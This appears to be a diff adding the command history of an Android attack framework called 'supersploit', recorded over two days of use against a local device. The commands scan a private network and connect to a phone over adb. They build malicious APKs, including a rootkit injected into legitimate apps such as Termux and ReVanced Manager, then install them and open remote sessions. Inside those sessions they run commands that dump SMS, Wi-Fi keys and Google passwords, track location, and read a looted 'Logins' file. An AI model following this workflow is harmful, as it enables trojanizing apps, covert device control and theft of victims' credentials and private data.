@@ -1,0 +1,6167 @@
+
+# 2026-06-06 14:10:31.844952
++use recon 11
+
+# 2026-06-06 14:10:38.150015
++search recon
+
+# 2026-06-06 14:10:48.742315
++use recon 1
+
+# 2026-06-06 14:10:53.832982
++run
+
+# 2026-06-06 14:13:19.643419
++set target 192.168.110.0/24
+
+# 2026-06-06 14:13:22.412475
++run
+
+# 2026-06-06 14:14:11.869088
++search recon
+
+# 2026-06-06 14:14:16.845587
++use recon 0
+
+# 2026-06-06 14:14:18.773609
++run
+
+# 2026-06-06 14:15:07.238437
++search targets
+
+# 2026-06-06 14:16:40.898156
++run
+
+# 2026-06-06 14:17:30.225951
++clear
+
+# 2026-06-06 14:17:35.490987
++search targets
+
+# 2026-06-06 14:18:00.017408
++use recon 1
+
+# 2026-06-06 14:18:01.443096
++run
+
+# 2026-06-06 14:18:32.131331
++set target 192.168.110.228
+
+# 2026-06-06 14:18:38.418756
++use recon 2
+
+# 2026-06-06 14:18:48.890829
++search recon
+
+# 2026-06-06 14:18:54.470966
++use recon 4
+
+# 2026-06-06 14:18:57.076792
++run
+
+# 2026-06-06 14:21:59.646589
++use recon 5
+
+# 2026-06-06 14:22:01.850117
++run
+
+# 2026-06-06 14:24:02.753877
++set port 443
+
+# 2026-06-06 14:24:04.559000
++run
+
+# 2026-06-06 14:25:37.869314
++search targets
+
+# 2026-06-06 14:26:08.329252
++use target 2
+
+# 2026-06-06 14:26:16.484066
++search exploits android
+
+# 2026-06-06 14:27:13.999986
++adb connect 192.168.110.228
+
+# 2026-06-06 14:28:22.462245
++adb devices
+
+# 2026-06-06 14:29:05.661167
++adb root
+
+# 2026-06-06 14:29:23.209134
++adb tcpip 5555
+
+# 2026-06-06 14:29:29.448503
++adb connect 192.168.110.228
+
+# 2026-06-06 14:29:48.409519
++clear
+
+# 2026-06-06 14:29:55.729586
++generate-apk
+
+# 2026-06-06 14:30:16.210778
++set host 192.168.110.158
+
+# 2026-06-06 14:30:24.649022
++set l_port 5000
+
+# 2026-06-06 14:30:48.378485
++set ANDROID_PAYLOAD_TYPE drs
+
+# 2026-06-06 14:31:10.908624
++generate-apk
+
+# 2026-06-06 14:38:21.150743
++help vars
+
+# 2026-06-06 14:38:23.949720
++clear
+
+# 2026-06-06 14:38:29.182056
++help generate-apk
+
+# 2026-06-06 14:38:41.186011
++ls
+
+# 2026-06-06 14:39:13.339994
++generate-apk rootkit inject=revanced-manager-2.6.0.apk
+
+# 2026-06-06 15:25:39.169073
++clear
+
+# 2026-06-06 15:25:45.162003
++help vars
+
+# 2026-06-06 15:25:49.561245
++show
+
+# 2026-06-06 15:25:52.881953
++help vars
+
+# 2026-06-06 15:26:22.306187
++set COMP_ARCH  armeabi-v7a
+
+# 2026-06-06 15:27:35.375160
++set APK_ARCH armv7
+
+# 2026-06-06 15:28:19.372520
++clear
+
+# 2026-06-06 15:28:20.980185
++show
+
+# 2026-06-06 15:28:34.414990
++generate-apk rootkit inject=revanced-manager-2.6.0.apk
+
+# 2026-06-06 15:33:39.056929
++clear
+
+# 2026-06-06 15:33:42.338533
++ls payloads
+
+# 2026-06-06 15:33:49.279549
++ls payloads/android
+
+# 2026-06-06 15:34:15.817882
++generate-apk-buildozer drs
+
+# 2026-06-06 15:35:52.423857
++generate-apk drs
+
+# 2026-06-06 15:36:17.620461
++adb install payloads/android/payload.apk
+
+# 2026-06-06 15:36:36.370794
++clear
+
+# 2026-06-06 15:36:54.592166
++bash
+
+# 2026-06-06 15:37:43.419000
++clear
+
+# 2026-06-06 15:37:45.960573
++adb install payloads/android/payload.apk
+
+# 2026-06-06 15:37:58.521636
++adb tcpip 5555
+
+# 2026-06-06 15:38:04.562240
++adb connect 192.168.110.228
+
+# 2026-06-06 15:38:07.897951
++clear
+
+# 2026-06-06 15:39:05.187403
++adb shell dumpsys packages org.supersploit.stub
+
+# 2026-06-06 15:39:09.753935
++adb shell dumpsys package org.supersploit.stub
+
+# 2026-06-06 15:39:29.122547
++clear
+
+# 2026-06-06 15:39:43.690866
++adb shell dumpsys package org.supersploit.stub > Installed_rootkit.txt
+
+# 2026-06-06 15:41:02.933992
++ls
+
+# 2026-06-06 15:46:02.603376
++generate-apk rootkit inject=revanced-manager-2.6.0.apk
+
+# 2026-06-06 15:58:53.918050
++clear
+
+# 2026-06-06 16:00:08.435135
++ls payloads/android
+
+# 2026-06-06 16:00:13.916132
++clear
+
+# 2026-06-06 16:00:18.692112
++adb install payloads/android/payload.apk
+
+# 2026-06-06 16:19:01.526805
++ls
+
+# 2026-06-06 16:19:12.398687
++cd ss
+
+# 2026-06-06 16:19:13.358561
++ls
+
+# 2026-06-06 16:20:14.551868
++generate-apk rootkit inject=com.termux_1002.apk
+
+# 2026-06-06 16:21:22.945418
++adb install payloads/android/payload.apk
+
+# 2026-06-06 16:25:24.894828
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 16:25:32.037948
++adb install payloads/android/payload.apk
+
+# 2026-06-06 16:25:47.302313
++ls
+
+# 2026-06-06 16:25:50.094415
++cd ss
+
+# 2026-06-06 16:25:50.966374
++ls
+
+# 2026-06-06 16:25:59.518585
++adb install payloads/android/payload.apk
+
+# 2026-06-06 16:26:25.743507
++cd ss
+
+# 2026-06-06 16:26:53.415672
++ls
+
+# 2026-06-06 16:27:17.097165
++adb install com.termux_1002.apk
+
+# 2026-06-06 16:28:22.505777
++cd ss
+
+# 2026-06-06 16:28:23.433570
++ls
+
+# 2026-06-06 16:28:49.674082
++adb push com.termux_1002.apk /sdcard/termux.apk
+
+# 2026-06-06 16:30:55.356499
++cd ss
+
+# 2026-06-06 16:30:57.068642
++adb push com.termux_1002.apk /sdcard/termux.apk
+
+# 2026-06-06 16:31:07.988892
++adb disconnect
+
+# 2026-06-06 16:31:11.308910
++adb connect 192.168.110.228
+
+# 2026-06-06 16:31:22.677244
++adb push com.termux_1002.apk /sdcard/termux.apk
+
+# 2026-06-06 16:31:26.957200
++adb disconnect
+
+# 2026-06-06 16:31:30.613293
++adb devices
+
+# 2026-06-06 16:31:34.749324
++adb disconnect
+
+# 2026-06-06 16:31:36.765335
++adb devices
+
+# 2026-06-06 16:31:42.917544
++adb kill-server
+
+# 2026-06-06 16:43:07.858617
++adb connect 192.168.110.228
+
+# 2026-06-06 16:45:27.242016
++adb tcpip 5555
+
+# 2026-06-06 16:45:30.130351
++adb connect 192.168.110.228
+
+# 2026-06-06 16:46:11.438422
++adb devices
+
+# 2026-06-06 16:46:18.998615
++adb disconnect
+
+# 2026-06-06 16:46:25.078978
++adb devices
+
+# 2026-06-06 16:46:37.423076
++adb kill-server
+
+# 2026-06-06 16:46:48.327283
++adb disconnect
+
+# 2026-06-06 16:46:52.711286
++adb devices
+
+# 2026-06-06 16:47:08.271347
++adb install com.termux_1002.apk
+
+# 2026-06-06 16:47:11.439786
++cd s
+
+# 2026-06-06 16:47:17.527712
++cd ss
+
+# 2026-06-06 16:49:47.242687
++adb install com.termux_1002.apk
+
+# 2026-06-06 16:50:51.403973
++bash
+
+# 2026-06-06 16:51:35.540887
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 16:51:44.853652
++clear
+
+# 2026-06-06 16:53:23.733704
++generate-apk messages
+
+# 2026-06-06 16:53:37.560685
++adb install payloads/android/payload.apk
+
+# 2026-06-06 16:53:55.679972
++set LISTENER true
+
+# 2026-06-06 16:55:07.829046
++adb shell am start-service org.supersploit.stub/.PayloadService
+
+# 2026-06-06 16:55:17.572934
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 17:08:57.655844
++exit
+
+# 2026-06-06 17:12:07.916642
++set LISTENER true
+
+# 2026-06-06 17:12:13.545045
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 17:17:35.192479
++set LISTENER true
+
+# 2026-06-06 17:17:39.704502
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 17:17:45.085613
++clear
+
+# 2026-06-06 17:17:48.405464
++sessions
+
+# 2026-06-06 17:17:55.327474
++sessions -i 1
+
+# 2026-06-06 17:23:16.659258
++set LISTENER true
+
+# 2026-06-06 17:23:58.326555
++sessions -i 1
+
+# 2026-06-06 17:26:24.079370
++generate-apk drs
+
+# 2026-06-06 17:26:33.809662
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:26:46.385525
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 17:26:48.637087
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:27:09.604685
++set LISTENER true
+
+# 2026-06-06 17:28:51.513428
++sessions -i 1
+
+# 2026-06-06 17:32:47.130948
++set LISTENER true
+
+# 2026-06-06 17:34:29.286425
++sessions -i 1
+
+# 2026-06-06 17:34:41.295198
++cclear
+
+# 2026-06-06 17:34:46.615486
++clear
+
+# 2026-06-06 17:35:12.949207
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:35:22.373659
++sessions
+
+# 2026-06-06 17:35:27.665668
++sessions -i 2
+
+# 2026-06-06 17:35:32.449561
++clear
+
+# 2026-06-06 17:35:36.745094
++sessions
+
+# 2026-06-06 17:36:08.238544
++sessions -i 3
+
+# 2026-06-06 17:37:04.610743
++clear
+
+# 2026-06-06 17:37:51.705662
++ls
+
+# 2026-06-06 17:37:54.054260
++clear
+
+# 2026-06-06 17:38:40.258470
++generate-apk rootkit
+
+# 2026-06-06 17:39:17.099467
++sessions -i 3
+
+# 2026-06-06 17:46:11.878638
++sessions -i 4
+
+# 2026-06-06 17:46:17.430757
++clear
+
+# 2026-06-06 17:46:24.624798
++generate-apk drs
+
+# 2026-06-06 17:46:56.745985
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:56:19.363777
++generate-apk rootkit
+
+# 2026-06-06 17:56:25.579357
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:56:31.730986
++cd ss
+
+# 2026-06-06 17:56:32.626885
++adb install payloads/android/payload.apk
+
+# 2026-06-06 17:57:00.649969
++set LISTENER true
+
+# 2026-06-06 17:57:16.576664
++sessions -i 1
+
+# 2026-06-06 18:02:09.877238
++exit
+
+# 2026-06-06 18:02:14.869582
++generate-apk rootkit
+
+# 2026-06-06 18:02:21.525483
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:02:26.933618
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:02:29.308692
++cd ss
+
+# 2026-06-06 18:02:30.525411
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:02:55.909809
++set LISTENER true
+
+# 2026-06-06 18:03:11.933924
++sessions -i 1
+
+# 2026-06-06 18:16:41.007582
++generate-apk rootkit
+
+# 2026-06-06 18:17:11.370791
++set L_HOST 127.0.0.1
+
+# 2026-06-06 18:17:12.406093
++set L_PORT 4444
+
+# 2026-06-06 18:17:12.439039
++generate-apk rootkit test_rootkit.apk
+
+# 2026-06-06 18:17:48.655135
++clear
+
+# 2026-06-06 18:17:50.871482
++help
+
+# 2026-06-06 18:17:59.753430
++help auto_root
+
+# 2026-06-06 18:19:40.101800
++set L_HOST 127.0.0.1
+
+# 2026-06-06 18:19:41.173387
++set L_PORT 4444
+
+# 2026-06-06 18:19:41.232858
++generate-apk rootkit test_rootkit.apk
+
+# 2026-06-06 18:20:37.195961
++clear
+
+# 2026-06-06 18:20:42.302042
++exit
+
+# 2026-06-06 18:20:51.612670
++generate-apk rootkit
+
+# 2026-06-06 18:20:58.509502
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:21:01.356726
++cd ss
+
+# 2026-06-06 18:21:04.556783
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:21:08.100967
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:21:40.485694
++set LISTENER true
+
+# 2026-06-06 18:22:01.702133
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:22:18.086700
++clear
+
+# 2026-06-06 18:22:28.919073
++set host 192.168.110.158
+
+# 2026-06-06 18:22:39.359431
++set l_port 5000
+
+# 2026-06-06 18:22:42.823341
++generate-apk rootkit
+
+# 2026-06-06 18:23:07.487999
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:23:17.081205
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:23:28.608568
++set LISTENER true
+
+# 2026-06-06 18:23:47.585336
++sessions -i 1
+
+# 2026-06-06 18:26:35.903450
++sessions
+
+# 2026-06-06 18:27:55.449048
++set L_HOST 192.168.110.158
+
+# 2026-06-06 18:27:56.489162
++set L_PORT 5555
+
+# 2026-06-06 18:27:56.529973
++generate-apk rootkit full_test.apk
+
+# 2026-06-06 18:28:45.927729
++set L_PORT 5555
+
+# 2026-06-06 18:28:46.989251
++banner
+
+# 2026-06-06 18:28:47.061960
++# The banner command just refreshes, giving time for the listener thread to start
+
+# 2026-06-06 18:28:47.119819
++# (The listener starts when the app starts if it was already running, but here we just launched it)
+
+# 2026-06-06 18:28:47.159252
++# We need to wait for the session. Let's try listing sessions a few times.
+
+# 2026-06-06 18:28:47.181432
++sessions
+
+# 2026-06-06 18:28:47.269455
++sessions -i 1
+
+# 2026-06-06 18:28:47.291276
++auto_root
+
+# 2026-06-06 18:28:47.320740
++dump_sms
+
+# 2026-06-06 18:28:47.351416
++dump_wifi
+
+# 2026-06-06 18:28:47.397705
++dump_google_passwords
+
+# 2026-06-06 18:28:47.422916
++exit
+
+# 2026-06-06 18:29:03.094014
++set L_HOST 192.168.110.158
+
+# 2026-06-06 18:29:03.125349
++set L_PORT 5555
+
+# 2026-06-06 18:29:03.148778
++banner
+
+# 2026-06-06 18:29:03.180654
++sessions
+
+# 2026-06-06 18:29:07.604147
++sessions -i 1
+
+# 2026-06-06 18:29:07.641169
++auto_root
+
+# 2026-06-06 18:29:07.673256
++dump_sms
+
+# 2026-06-06 18:29:07.696784
++dump_wifi
+
+# 2026-06-06 18:29:07.735908
++dump_google_passwords
+
+# 2026-06-06 18:29:07.760370
++background
+
+# 2026-06-06 18:29:07.781910
++sessions
+
+# 2026-06-06 18:29:12.611694
++sessions -i 1
+
+# 2026-06-06 18:29:12.639762
++auto_root
+
+# 2026-06-06 18:29:12.671923
++dump_sms
+
+# 2026-06-06 18:29:12.698358
++dump_wifi
+
+# 2026-06-06 18:29:12.729851
++dump_google_passwords
+
+# 2026-06-06 18:29:12.761491
++background
+
+# 2026-06-06 18:29:12.800559
++sessions
+
+# 2026-06-06 18:29:17.599450
++sessions -i 1
+
+# 2026-06-06 18:29:17.639840
++auto_root
+
+# 2026-06-06 18:29:17.663315
++dump_sms
+
+# 2026-06-06 18:29:17.701804
++dump_wifi
+
+# 2026-06-06 18:29:17.733797
++dump_google_passwords
+
+# 2026-06-06 18:29:17.763326
++background
+
+# 2026-06-06 18:29:17.787304
++sessions
+
+# 2026-06-06 18:29:22.604151
++sessions -i 1
+
+# 2026-06-06 18:29:22.656487
++auto_root
+
+# 2026-06-06 18:29:22.682785
++dump_sms
+
+# 2026-06-06 18:29:22.707238
++dump_wifi
+
+# 2026-06-06 18:29:22.734648
++dump_google_passwords
+
+# 2026-06-06 18:29:22.768880
++background
+
+# 2026-06-06 18:29:22.788688
++sessions
+
+# 2026-06-06 18:29:27.603418
++sessions -i 1
+
+# 2026-06-06 18:29:27.632449
++auto_root
+
+# 2026-06-06 18:29:27.657028
++dump_sms
+
+# 2026-06-06 18:29:27.759101
++dump_wifi
+
+# 2026-06-06 18:29:27.787058
++dump_google_passwords
+
+# 2026-06-06 18:29:27.811830
++background
+
+# 2026-06-06 18:29:27.830253
++sessions
+
+# 2026-06-06 18:29:32.594957
++sessions -i 1
+
+# 2026-06-06 18:29:32.629645
++auto_root
+
+# 2026-06-06 18:29:32.657399
++dump_sms
+
+# 2026-06-06 18:29:32.678956
++dump_wifi
+
+# 2026-06-06 18:29:32.715563
++dump_google_passwords
+
+# 2026-06-06 18:29:32.739710
++background
+
+# 2026-06-06 18:29:32.760519
++exit
+
+# 2026-06-06 18:31:38.206350
++set L_HOST 192.168.110.158
+
+# 2026-06-06 18:31:38.246455
++set L_PORT 5555
+
+# 2026-06-06 18:31:38.269019
++banner
+
+# 2026-06-06 18:31:38.303634
++# Wait for session
+
+# 2026-06-06 18:31:38.329929
++sleep 30
+
+# 2026-06-06 18:32:08.352551
++sessions
+
+# 2026-06-06 18:32:08.371452
++sessions -i 1
+
+# 2026-06-06 18:32:08.389247
++auto_root
+
+# 2026-06-06 18:32:08.412592
++dump_sms
+
+# 2026-06-06 18:32:08.430641
++dump_wifi
+
+# 2026-06-06 18:32:08.452043
++dump_google_passwords
+
+# 2026-06-06 18:32:08.468537
++exit
+
+# 2026-06-06 18:39:10.537105
++set LISTENER true
+
+# 2026-06-06 18:39:23.939173
++set host 192.168.110.158
+
+# 2026-06-06 18:39:31.033799
++set l_port 5000
+
+# 2026-06-06 18:39:36.137951
++set LISTENER true
+
+# 2026-06-06 18:39:44.851514
++generate-apk rootkit
+
+# 2026-06-06 18:39:49.852386
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:39:53.161734
++cd ss
+
+# 2026-06-06 18:39:57.036202
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:40:15.619330
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:40:18.245860
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:40:35.059578
++sessions -i 1
+
+# 2026-06-06 18:42:00.175730
++exit
+
+# 2026-06-06 18:44:43.913961
++set L_HOST 192.168.110.158
+
+# 2026-06-06 18:44:44.975370
++set L_PORT 5000
+
+# 2026-06-06 18:44:45.020813
++generate-apk rootkit fix_test.apk
+
+# 2026-06-06 18:45:13.745200
++set L_PORT 5000
+
+# 2026-06-06 18:45:13.776390
++banner
+
+# 2026-06-06 18:45:13.802678
++sleep 20
+
+# 2026-06-06 18:45:33.825073
++sessions
+
+# 2026-06-06 18:45:33.849693
++sessions -i 1
+
+# 2026-06-06 18:45:33.866350
++id
+
+# 2026-06-06 18:45:33.901455
++get_location
+
+# 2026-06-06 18:45:33.920769
++dump_wifi
+
+# 2026-06-06 18:45:33.953455
++dump_google_passwords
+
+# 2026-06-06 18:45:33.969970
++exit
+
+# 2026-06-06 18:49:03.456631
++set ANDROID_PAYLOAD_TYPE rootkit
+
+# 2026-06-06 18:49:12.345443
++generate-apk
+
+# 2026-06-06 18:49:18.947509
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:49:23.586666
++cd ss
+
+# 2026-06-06 18:49:27.505673
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:49:38.244341
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:49:43.564841
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:50:02.534834
++set LISTENER true
+
+# 2026-06-06 18:50:18.408489
++sessions -i 1
+
+# 2026-06-06 18:51:33.952356
++exit
+
+# 2026-06-06 18:53:12.981340
++set LISTENER true
+
+# 2026-06-06 18:53:22.423445
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 18:53:36.390649
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 18:53:42.526259
++adb install payloads/android/payload.apk
+
+# 2026-06-06 18:54:00.197630
++sessions -i 1
+
+# 2026-06-06 19:06:38.912292
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:07:05.344450
++set LISTENER true
+
+# 2026-06-06 19:07:14.666201
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:07:19.722392
++adb connect 192.168.110.228
+
+# 2026-06-06 19:07:22.218573
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:07:30.803056
++clear
+
+# 2026-06-06 19:07:49.277363
++generate-apk rootkit fix_test.apk
+
+# 2026-06-06 19:08:13.453403
++generate-apk drs
+
+# 2026-06-06 19:08:20.646548
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:08:24.877946
++cd ss
+
+# 2026-06-06 19:08:26.427096
++clear
+
+# 2026-06-06 19:08:27.574112
++cd ss
+
+# 2026-06-06 19:08:28.790057
++clear
+
+# 2026-06-06 19:08:30.766201
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:08:44.583013
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:08:46.519194
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:08:52.663387
++set LISTENER true
+
+# 2026-06-06 19:09:05.071446
++sessions -i 1\
+
+# 2026-06-06 19:09:07.584126
++sessions -i 1
+
+# 2026-06-06 19:11:08.982718
++clear
+
+# 2026-06-06 19:11:23.479539
++generate-apk mess
+
+# 2026-06-06 19:11:28.391812
++generate-apk messages
+
+# 2026-06-06 19:11:33.214677
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:11:40.888450
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:12:38.547382
++generate-apk-buildozer rootkit
+
+# 2026-06-06 19:12:49.051944
++clear
+
+# 2026-06-06 19:12:51.331935
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:12:54.668074
++cd ss
+
+# 2026-06-06 19:12:55.868148
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:13:09.109032
++set LISTENER true
+
+# 2026-06-06 19:13:23.893655
++clear
+
+# 2026-06-06 19:13:29.446012
++set LISTENER true
+
+# 2026-06-06 19:13:37.390455
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:13:53.023351
++sessions -i 1
+
+# 2026-06-06 19:16:51.825190
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:17:00.871871
++generate-apk drs
+
+# 2026-06-06 19:17:07.349763
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:17:43.154980
++id
+
+# 2026-06-06 19:17:51.931347
++sessions -i 2
+
+# 2026-06-06 19:22:40.940650
++clear
+
+# 2026-06-06 19:22:49.333597
++generate-apk rootkit
+
+# 2026-06-06 19:23:14.147086
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:23:21.504190
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:23:30.890346
++set LISTENER true
+
+# 2026-06-06 19:23:46.913790
++\
+
+# 2026-06-06 19:23:51.015136
++clear
+
+# 2026-06-06 19:23:56.081549
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:24:13.729256
++set LISTENER true
+
+# 2026-06-06 19:24:24.672825
++generate-apk rootkit
+
+# 2026-06-06 19:24:34.167569
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:24:39.828371
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:25:05.678983
++sessions
+
+# 2026-06-06 19:25:09.158927
++sessions -i 3
+
+# 2026-06-06 19:27:47.727905
++exit
+
+# 2026-06-06 19:28:06.272944
++generate-apk-buildozer rootkit
+
+# 2026-06-06 19:48:51.441132
++set LISTENER true
+
+# 2026-06-06 19:49:01.904566
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:49:14.753265
++adb uninstall org.supersploit.stub
+
+# 2026-06-06 19:49:30.055334
++generate-apk drs
+
+# 2026-06-06 19:49:46.833141
++clear
+
+# 2026-06-06 19:49:50.847791
++adb install payloads/android/payload.apk
+
+# 2026-06-06 19:50:10.337227
++set LISTENER true
+
+# 2026-06-06 19:50:50.738746
++ip addr
+
+# 2026-06-06 19:51:08.402815
++adb shell am startservice org.supersploit.stub/.PayloadService
+
+# 2026-06-06 19:51:17.051374
++set LISTENER true
+
+# 2026-06-06 19:52:48.654236
++ping 192.168.110.228
+
+# 2026-06-06 19:53:07.522397
++set LISTENER true
+
+# 2026-06-06 19:53:21.906025
++sessions -i 2
+
+# 2026-06-06 19:56:25.815119
++ls .data
+
+# 2026-06-06 19:56:30.851561
++ls .data/.loot
+
+# 2026-06-06 19:56:43.123198
++cat Logins
+
+# 2026-06-06 19:56:56.196313
++cat .data/.loot/Logins
+
+# 2026-06-06 19:57:06.966026
++sessions -i 2
+
+# 2026-06-06 21:27:58.288776
++generate-apk-buildozer rootkit
+
+# 2026-06-06 21:30:30.595943
++set L_HOST 127.0.0.1
+
+# 2026-06-06 21:30:31.652548
++set L_PORT 4444
+
+# 2026-06-06 21:30:31.711610
++generate-apk-buildozer rootkit kivy_test_rootkit.apk
+
+# 2026-06-06 21:30:54.792235
++clear
+
+# 2026-06-07 06:40:37.053408
++set L_HOST 192.168.110.158
+
+# 2026-06-07 06:40:38.105375
++set L_PORT 5000
+
+# 2026-06-07 06:40:38.147921
++generate-apk-buildozer rootkit kivy_final_test.apk
+
+# 2026-06-07 06:51:04.779382
++generate-apk-buildozer rootkit
+
+# 2026-06-07 06:53:44.312759
++clear
+
+# 2026-06-07 06:53:56.480546
++ps aux
+
+# 2026-06-07 06:54:10.568814
++ps aux | grep "python3"
+
+# 2026-06-07 06:54:21.186027
++ps aux
+
+# 2026-06-07 06:54:33.761141
++ps
+
+# 2026-06-07 06:54:37.937644
++clear
+
+# 2026-06-07 06:54:39.910595
++man ps
+
+# 2026-06-07 06:55:01.082392
++ps axu
+
+# 2026-06-07 06:55:07.346613
++ps e
+
+# 2026-06-07 06:55:18.626997
++clear
+
+# 2026-06-07 06:55:20.387726
++ps e
+
+# 2026-06-07 06:55:34.841582
++bash
+
+# 2026-06-07 06:57:56.371807
++ls -la | grep main
+
+# 2026-06-07 06:57:57.402916
++exit
+
+# 2026-06-07 06:58:09.915568
++echo "hello world" | grep hello
+
+# 2026-06-07 06:58:10.942975
++exit
+
+# 2026-06-07 06:59:20.491095
++ls
+
+# 2026-06-07 06:59:24.091063
++cd ss
+
+# 2026-06-07 06:59:25.235095
++ls
+
+# 2026-06-07 06:59:47.035777
++ps e | grep "python3"
+
+# 2026-06-07 07:00:02.532946
++ps e 
+
+# 2026-06-07 07:00:05.155831
++clear
+
+# 2026-06-07 07:00:07.253378
++ps e 
+
+# 2026-06-07 07:00:19.580655
++ps aux
+
+# 2026-06-07 07:00:31.909400
++ps aux | grep "python3"
+
+# 2026-06-07 07:00:37.597561
++clear
+
+# 2026-06-07 07:00:50.934183
++generate-apk-buildozer rootkit
+
+# 2026-06-07 07:01:05.567257
++ps aux | grep "python3"
+
+# 2026-06-07 07:13:03.365713
++exploit
+
+# 2026-06-07 07:13:11.974318
++clear
+
+# 2026-06-07 07:13:17.982548
++exit
+
+# 2026-06-07 08:51:40.713008
++exit
+
+# 2026-06-07 08:51:48.246755
++generate-apk-buildozer rootkit
+
+# 2026-06-07 08:53:25.258552
++clear
+
+# 2026-06-07 08:55:27.836544
++adb connect 192.168.110.228
+
+# 2026-06-07 08:55:50.516841
++ip addr
+
+# 2026-06-07 08:56:01.816324
++adb connect 192.168.37.228
+
+# 2026-06-07 08:56:19.928965
++adb install payloads/android/android_payload.apk
+
+# 2026-06-07 08:56:23.793264
++cd ss
+
+# 2026-06-07 08:56:25.385205
++clear
+
+# 2026-06-07 08:56:26.497300
++cd ss
+
+# 2026-06-07 08:56:28.625375
++adb install payloads/android/android_payload.apk
+
+# 2026-06-07 08:56:35.439853
++ls payloads/android
+
+# 2026-06-07 08:58:11.077749
++generate-apk-buildozer rootkit
+
+# 2026-06-07 08:58:45.151081
++ip addr
+
+# 2026-06-07 08:58:56.135654
++set host 192.168.37.158
+
+# 2026-06-07 08:59:03.392976
++generate-apk-buildozer rootkit
+
+# 2026-06-07 09:03:40.400985
++cd .data
+
+# 2026-06-07 09:03:41.187904
++ls
+
+# 2026-06-07 09:03:44.603370
++ls -a
+
+# 2026-06-07 09:03:57.563887
++cd data
+
+# 2026-06-07 09:04:03.435743
++show aliases
+
+# 2026-06-07 09:04:15.482035
++cd config
+
+# 2026-06-07 09:04:18.092242
++cd ..
+
+# 2026-06-07 09:04:20.604535
++ls -a
+
+# 2026-06-07 09:04:32.837691
++cd .assets
+
+# 2026-06-07 09:04:33.844987
++ls
+
+# 2026-06-07 09:05:02.855027
++cp Logov2.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:05:22.631340
++cp Logo-v2.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:05:29.441035
++sudo cp Logo-v2.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:05:35.697310
++clear
+
+# 2026-06-07 09:21:24.859901
++cd config/..
+
+# 2026-06-07 09:21:28.299693
++cd config
+
+# 2026-06-07 09:21:34.803983
++cd ..
+
+# 2026-06-07 09:21:37.276179
++clear
+
+# 2026-06-07 09:21:51.188803
++cd .assets
+
+# 2026-06-07 09:22:03.269661
++sudo cp Logo-v2_mini.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:22:15.693903
++ls
+
+# 2026-06-07 09:22:40.054763
++cd ~
+
+# 2026-06-07 09:22:49.152153
++cd Documents
+
+# 2026-06-07 09:22:50.713823
++ls
+
+# 2026-06-07 09:22:55.932197
++cd *
+
+# 2026-06-07 09:22:58.479107
++bash
+
+# 2026-06-07 09:24:01.705699
++pwd
+
+# 2026-06-07 09:24:06.330654
++sudo cp Logo-v2_mini.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:24:07.913976
++ls
+
+# 2026-06-07 09:24:32.187633
++cd SupersSploit-private-assets
+
+# 2026-06-07 09:24:40.060280
++cd Supersploit-private-assets
+
+# 2026-06-07 09:24:42.017116
++clear
+
+# 2026-06-07 09:24:45.283575
++cd logos
+
+# 2026-06-07 09:24:49.060268
++sudo cp Logo-v2_mini.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 09:24:50.347677
++ls
+
+# 2026-06-07 09:25:11.068685
++sudo cp Logo1_v2_mini.png /usr/share/icons/hicolor/16x16/apps/logo1.png
+
+# 2026-06-07 10:30:10.460628
++cd ss/.data/.assets
+
+# 2026-06-07 10:30:15.954929
++cd .data/.assets
+
